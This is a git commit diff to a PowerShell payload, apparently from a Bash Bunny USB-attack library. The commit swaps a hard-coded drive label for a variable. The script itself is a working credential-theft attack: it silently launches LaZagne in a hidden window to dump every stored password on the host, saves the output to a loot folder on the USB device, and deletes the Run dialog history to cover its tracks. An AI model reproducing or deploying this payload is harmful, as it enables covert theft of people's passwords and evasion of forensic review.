f7cf46fd952601f4a5ecfe9cd72510439bb4b89a
Rafa Guillermo <rafa@rggi.eu>
2024-09-30 20:21:11 +0200

    Update payload.ps1
    added missed $drivelabel reference

--- payloads/library/credentials/NoDefenseAgainstLaZagne/payload.ps1
+++ payloads/library/credentials/NoDefenseAgainstLaZagne/payload.ps1
@@ -2,5 +2,5 @@ $drivelabel = 'BashBunny'
 $dest = ((Get-WmiObject win32_volume -f 'label=''$drivelabel''').Name+'loot\PasswordGrabber')
 $filter = 'password_'+ $env:COMPUTERNAME
 $filecount = ((Get-ChildItem -filter ($filter + "*") -path $dest | Measure-Object | Select -ExpandProperty Count) + 1)
-Start-Process -WindowStyle Hidden -FilePath ((Get-WmiObject win32_volume -f 'label=''BashBunny''').Name+'tooling\LaZagne.exe') -ArgumentList 'all -vv' -RedirectStandardOutput ($dest +'\' + $filter +'_' + $filecount +'.txt')
+Start-Process -WindowStyle Hidden -FilePath ((Get-WmiObject win32_volume -f 'label=''$drivelabel''').Name+'tooling\LaZagne.exe') -ArgumentList 'all -vv' -RedirectStandardOutput ($dest +'\' + $filter +'_' + $filecount +'.txt')
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
